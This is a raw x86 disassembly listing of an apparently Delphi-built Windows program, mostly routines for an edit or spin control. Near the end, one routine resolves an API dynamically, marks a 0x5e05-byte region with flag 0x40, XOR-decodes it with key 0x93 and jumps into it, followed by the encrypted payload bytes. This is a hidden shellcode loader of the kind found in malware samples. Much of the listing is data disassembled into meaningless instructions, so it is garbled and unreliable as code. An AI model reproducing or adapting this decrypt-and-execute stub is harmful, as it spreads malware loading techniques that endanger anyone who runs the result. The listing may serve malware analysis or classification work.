add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
js r-xdata
jb r-xdata
mov eax esi
call sub_461dbc
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
test al 0xfc
inc [ eax + eax * 8 - 0x475ef28c ]
sbb eax 0xd0f70046
inc edx
jne r-xdata
inc [ edx ]
lodsb [ esi ]
inc [ edx ]
loopne r-xdata
add ah bh
in al 0x28
inc esi
add [ esp + ebp * 2 + 0x60940043 ] bl
inc ebx
add [ esi + edi + 0x41 ] dh
push ebp
jo r-xdata
popad
inc esp
outsd
ja r-xdata
outsb
add [ ecx ] cl
dec edi
inc ebp
outsb
inc esp
jb r-xdata
add [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
jmp eax
add bh bh
loopne r-xdata
add [ ebx ] al
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
cld
mov [ esi + 0x50 ] eax
outsb
fcomp [ esi + eax * 2 ]
add [ edi ] al
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
mov ch 0x42
add [ eax + eax * 2 + 0x3ff00043 ] al
jb r-xdata
test al al
je r-xdata
jo r-xdata
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xb0680041 0x42
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ edx + ebp + 0x46 ] al
add [ edx ] al
add ch dl
call ebx
[ eax ]
sub [ esi ] eax
nop
sub [ esi ] eax
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
inc edx
jne r-xdata
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ebx
add al dh
aas
mov eax eax
and al 0x1c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sbb al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi + 0x208 ] eax
mov eax esi
call sub_461dbc
add [ eax ] al
xor edx edx
mov eax esi
call sub_462264
mov edx 0x14
mov eax esi
call sub_434370
mov edx 0x19
mov eax esi
call sub_434394
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
add al [ eax ]
add [ ebx ] dh
ror [ ebx + 0x480e8c6 ] cl
add [ eax ] al
je r-xdata
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_4621e8
outsb
and al 0x1c
inc esi
add [ edx + ebx * 4 ] ah
inc edx
add [ edi ] ah
add [ ebx + edx * 2 ] al
jo r-xdata
outsb
add [ eax ] al
sub_461cfc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4370bc
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42c460
call sub_42c540
test al al
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
call sub_461dbc
mov [ esi + 0x208 ] eax
mov eax esi
call sub_461dbc
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_4621e8
xor edx edx
mov eax esi
call sub_462264
mov edx 0x14
mov eax esi
call sub_434370
mov edx 0x19
mov eax esi
call sub_434394
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_461dbc
push ebx
push esi
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b068
mov ebx eax
mov [ ebx + 0x124 ] esi
mov [ ebx + 0x120 ] sub_4620bc
mov [ ebx + 0xd4 ] esi
mov [ ebx + 0xd0 ] sub_462020
mov dl 0x1
mov eax ebx
call sub_434ad4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov al [ r-xdata ]
mov [ ebx + 0x18c ] al
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax ebx
pop esi
pop ebx
retn
sub_461e1d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_434084
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x214 ]
jne r-xdata
xor eax eax
mov [ edi + 0x214 ] eax
sub_461e50
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ebp [ ebx + 0x208 ]
test ebp ebp
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp [ esi ] 0xf
jge r-xdata
mov eax [ esi ]
push eax
mov eax [ edi ]
sar eax 0x1
jns r-xdata
mov [ esi ] 0xf
push eax
xor ecx ecx
xor edx edx
mov eax ebp
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax [ esi ]
push eax
mov eax [ edi ]
mov edx [ ebx + 0x208 ]
mov ebp [ edx + 0x4c ]
sub eax ebp
inc eax
push eax
mov ecx ebp
dec ecx
xor edx edx
mov eax [ ebx + 0x20c ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
adc eax 0x0
sub_461ebc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_461e50
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ad7c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_461f00
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43997c
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_461e50
mov eax [ esp ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_43ad7c
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
xor eax eax
mov [ esi + 0xc ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_461f60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
mov al [ esi + 0x18c ]
or al [ r-xdata ]
mov [ esi + 0x18c ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
sub_461f89
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx eax
mov esi [ ebx + 0x210 ]
mov al [ r-xdata ]
not eax
and al [ esi + 0x18c ]
mov [ esi + 0x18c ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
sub_461fbb
mov ax [ edx ]
sub ax 0x20
je r-xdata
mov eax [ esi + 0x210 ]
mov si 0xffeb
call sub_403324
sub ax 0x6
je r-xdata
mov edx [ esi + 0x208 ]
mov eax esi
call sub_462100
mov eax [ esi + 0x208 ]
mov si 0xffeb
call sub_403324
pop esi
retn
sub ax 0x2
je r-xdata
mov edx [ esi + 0x20c ]
mov eax esi
call sub_462100
mov eax [ esi + 0x20c ]
mov si 0xffeb
call sub_403324
pop esi
retn
jmp r-xdata
pop esi
retn
sub_462020
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax edi
call sub_462100
mov ebx [ edi + 0x214 ]
test ebx ebx
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebx + 0x1a4 ] 0x0
je r-xdata
mov eax edi
call sub_43b390
mov ebx eax
call GetFocus
cmp ebx eax
je r-xdata
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax edi
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax [ edi + 0x214 ]
call sub_43b390
mov ebx eax
call GetFocus
cmp ebx eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ edi + 0x214 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
jmp r-xdata
sub_4620bc
push ebx
cmp edx [ eax + 0x208 ]
jne r-xdata
cmp [ eax + 0x222 ] 0x0
je r-xdata
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
pop ebx
retn
sub_462100
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ ebx + 0x1a4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
cmp edi [ ebx + 0x210 ]
je r-xdata
mov esi [ ebx + 0x210 ]
mov al [ r-xdata ]
not eax
and al [ esi + 0x18c ]
mov [ esi + 0x18c ] al
mov [ ebx + 0x210 ] edi
mov eax ebx
call sub_43b390
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov esi [ ebx + 0x210 ]
mov al [ esi + 0x18c ]
or al [ r-xdata ]
mov [ esi + 0x18c ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46217d
add [ eax ] al
add bh al
inc edx
or al 0x1
add [ eax ] al
add bl al
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_436c64
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_461e50
mov eax [ esp ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_43ad7c
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
sub_4621e8
push esi
mov esi eax
test edx edx
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call LoadBitmapA
push eax
mov eax [ esi + 0x208 ]
call sub_42b83c
pop edx
call sub_422154
mov dl 0x1
mov eax [ esi + 0x208 ]
call sub_42b86c
mov eax [ esi + 0x208 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
mov eax [ esi + 0x208 ]
call sub_42b848
pop esi
retn
sub_462264
push esi
mov esi eax
test edx edx
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call LoadBitmapA
push eax
mov eax [ esi + 0x20c ]
call sub_42b83c
pop edx
call sub_422154
mov dl 0x1
mov eax [ esi + 0x208 ]
call sub_42b86c
mov eax [ esi + 0x20c ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
mov eax [ esi + 0x20c ]
call sub_42b848
pop esi
retn
sub_4622d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42de68
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_461cfc
mov esi eax
mov [ ebx + 0x22c ] esi
mov eax esi
mov edx 0xf
call sub_434370
mov eax [ ebx + 0x22c ]
mov edx 0x11
call sub_434394
mov eax [ ebx + 0x22c ]
mov dl 0x1
call sub_434ad4
mov eax [ ebx + 0x22c ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x22c ]
mov [ eax + 0x214 ] ebx
mov [ eax + 0x21c ] ebx
mov edx [ ebx ]
mov edx [ edx + 0xec ]
mov [ eax + 0x218 ] edx
mov [ eax + 0x224 ] ebx
mov edx [ ebx ]
mov edx [ edx + 0xf0 ]
mov [ eax + 0x220 ] edx
mov edx r-xdata
mov eax ebx
call sub_434be4
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x230 ] 0x1
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4623dc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x22c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4371e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_462414
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ esi ] 0x26
jne r-xdata
cmp [ esi ] 0x28
jne r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xec ]
jmp r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a1bc
pop edx
pop esi
pop ebx
retn
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf0 ]
sub_462454
push ebx
push esi
mov ebx edx
mov esi eax
mov dl [ ebx ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_43a374
sub_462488
push ebx
push esi
push edi
add esp 0xffffffe0
mov ebx edx
mov esi eax
push esi
mov esi r-xdata
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax [ rw-data ]
mov al [ eax ]
and eax 0xff
bts [ esp ] eax
mov eax ebx
and eax 0xff
bt [ esp ] eax
jb r-xdata
mov al 0x1
cmp bl 0x20
jae r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
cmp bl 0x20
jae r-xdata
xor eax eax
jmp r-xdata
cmp bl 0xd
jne r-xdata
xor eax eax
cmp bl 0x8
je r-xdata
mov dl [ esi + 0x230 ]
xor dl 0x1
test dl al
je r-xdata
cmp bl 0x2e
jne r-xdata
sub_4624f6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx edx
mov edx ebx
call sub_42e2a8
mov eax [ ebx + 0x4 ]
or eax 0x4
or eax 0x2000000
mov [ ebx + 0x4 ] eax
pop ebx
retn
sub_462548
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax esp
push eax
push 0x0
push 0xb2
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax ebx
call sub_4345fc
inc eax
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4345b8
mov edx [ ebx + 0x22c ]
sub eax [ edx + 0x48 ]
sub eax 0x2
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp ] eax
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax esp
push eax
push 0x0
push 0xb2
mov eax ebx
call sub_43b390
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_4625c8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43997c
mov eax esi
call sub_462668
cmp eax [ esi + 0x4c ]
jle r-xdata
cmp [ esi + 0x22c ] 0x0
je r-xdata
mov edx eax
mov eax esi
call sub_434394
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ esi + 0x22c ]
mov edi [ edx + 0x48 ]
push edi
mov edx [ esi + 0x4c ]
sub edx 0x3
push edx
mov eax [ esi + 0x22c ]
mov edx [ esi + 0x48 ]
sub edx edi
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
mov edx [ esi + 0x22c ]
mov edi [ edx + 0x48 ]
push edi
mov edx [ esi + 0x4c ]
sub edx 0x5
push edx
mov eax [ esi + 0x22c ]
mov edx [ esi + 0x48 ]
sub edx edi
sub edx 0x5
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
mov eax esi
call sub_462548
sub_462668
push ebx
push esi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c570
push eax
push ebx
call SelectObject
mov esi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push esi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov ebx [ esp ]
mov esi [ esp + 0x38 ]
cmp ebx esi
jle r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx esi
sar ebx 0x2
add ebx esi
add eax ebx
add eax 0x2
add esp 0x70
pop esi
pop ebx
retn
add ebx 0x3
sub_4626d8
push ebx
mov ebx eax
cmp [ ebx + 0x20e ] 0x0
je r-xdata
mov eax ebx
call sub_4627b4
mov edx eax
add edx [ ebx + 0x228 ]
mov eax ebx
call sub_46283c
pop ebx
retn
push 0x0
call MessageBeep
pop ebx
retn
sub_462708
push ebx
mov ebx eax
cmp [ ebx + 0x20e ] 0x0
je r-xdata
mov eax ebx
call sub_4627b4
mov edx eax
sub edx [ ebx + 0x228 ]
mov eax ebx
call sub_46283c
pop ebx
retn
push 0x0
call MessageBeep
pop ebx
retn
sub_462778
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43a7b8
mov eax ebx
call sub_4627b4
mov edx eax
mov eax ebx
call sub_462894
mov esi eax
mov eax ebx
call sub_4627b4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4627b4
mov edx eax
mov eax ebx
call sub_46283c
sub_4627b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40387c#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_462800
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434bb4
mov eax [ ebp - 0x8 ]
call sub_407ec8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462830
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_46283c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_40387c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_462894
lea edx [ ebp - 0x4 ]
call sub_407d8c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_434be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46288d
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_462894
push esi
push edi
mov ecx edx
mov esi [ eax + 0x220 ]
mov edi [ eax + 0x224 ]
cmp esi edi
je r-xdata
mov eax ecx
pop edi
pop esi
retn
cmp esi edx
jle r-xdata
cmp edi edx
jge r-xdata
mov ecx esi
jmp r-xdata
mov ecx edi
sub_4628bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_42e690
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
mov eax ebx
call sub_42e154
sub_4628e4
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x188 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42b128
test bl bl
jle r-xdata
call sub_403128
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_462918
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_42b628
test [ ebx + 0x18c ] 0x2
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ ebx + 0x188 ] 0x0
jne r-xdata
push ebx
push sub_4629c4
mov eax [ ebx + 0x188 ]
call sub_42825c
mov edx 0x190
mov eax [ ebx + 0x188 ]
call sub_42824c
mov dl 0x1
mov eax [ ebx + 0x188 ]
call sub_42823c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280b4
mov [ ebx + 0x188 ] eax
sub_462990
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_42b720
mov eax [ ebx + 0x188 ]
test eax eax
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
call sub_42823c
sub_4629c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x188 ]
mov edx 0x64
call sub_42824c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x182 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_434ddc
test al al
je r-xdata
xor eax eax
push ebp
push j_sub_4035c8#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_462a44
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_42b160
test [ ebx + 0x18c ] 0x1
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4124ac
push 0xfffffffd
push 0xfffffffd
lea eax [ esp + 0x8 ]
push eax
call InflateRect
cmp [ ebx + 0x182 ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x160 ]
call sub_41d4a0
push eax
call DrawFocusRect
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
sub_462aac
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40387c#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ad8
retn
sub_462af5
sub al 0x46
add [ esp + ebp ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x1c00462c ] bh
add eax [ eax ]
add ah al
mov al 0x44
add al ah
cdq
inc ecx
add ah bl
fld [ eax + eax - 0x70 ]
fild [ eax + eax - 0x7c ]
xor eax [ eax ]
cld
add eax [ ebp ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
clc
fild [ eax + eax + 0x64 ]
mov esi 0xe5680043
inc esp
add [ esi + edi + 0x41 ] dh
add [ eax - 0xbffbb1f ] bh
loope r-xdata
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] al
jecxz r-xdata
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x15 ] al
inc esp
add [ edx + ebp * 8 ] cl
inc esp
add [ eax + 0x4c ] cl
inc ebx
add [ eax - 0x1bffbb15 ] bh
outsb
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dh
mov [ ebx ] al
and bh bh
inc esp
add [ eax + 0x3c004502 ] al
add [ ebp ] eax
enter 0x4388 0x0
int3
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ eax - 0x15 ] bh
inc esp
add al bl
xchg esi eax
inc ecx
add [ eax ] bl
daa
inc ebp
add [ eax - 0x24 ] dl
inc esp
add [ eax - 0x47 ] bh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x18 ] bl
inc esp
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ ecx + ebp * 8 + 0x44 ] cl
sub_462d0c
push ebp
mov ebp esp
add esp 0xffffffec
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push r-xdata
call sub_462d0c
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5e05
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0xc ]
nop
xor eax eax
mov [ ebp - 0x14 ] eax
mov al [ eax ]
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
xor al 0x93
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
jae r-xdata
call sub_403068
mov [ edx ] al
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x5e06
jne r-xdata
call sub_403068
nop
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
jae r-xdata
nop
nop
mov eax [ ebp + 0x8 ]
add eax 0x554f
jae r-xdata
mov [ ebp - 0x4 ] eax
nop
nop
jmp [ ebp - 0x4 ]
call sub_403068
sub_462f67
cmc
sbb dl dh
test [ eax ] ebx
push ecx
jpe r-xdata
add eax [ ebx ]
add edx [ eax ]
jpo r-xdata
mov bl 0x93
xchg ebx eax
add eax eax
insb
out 0x77 al
jpe r-xdata
adc eax 0x9393937f
push ss
push ebx
pushfd
pop ss
loopne r-xdata
push edi
retn
cmpsb [ esi ] [ edi ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
sbb dl [ 0xffffffff9393937b ]
lea edx [ ebx - 0xf4a046d ]
idiv bh
jpe r-xdata
xchg ebx eax
xchg ebx eax
sbb [ ebp + 0x52 ] bl
jb r-xdata
jecxz r-xdata
lea edx [ ebx - 0x4ca8ef6d ]
adc [ ebx + 0x57246c93 ] 0x93
xchg ebx eax
xchg ebx eax
jpe r-xdata
jpo r-xdata
sbb [ ebp + 0x7a ] ch
pop esp
mov esp 0x3039393
sti
adc al 0x34
movsd [ edi ] [ esi ]
les ebx [ edx ]
adc eax 0x93939323
jpo r-xdata
push esp
mov al [ 0xffffffff82d37aa1 ]
xchg ebx eax
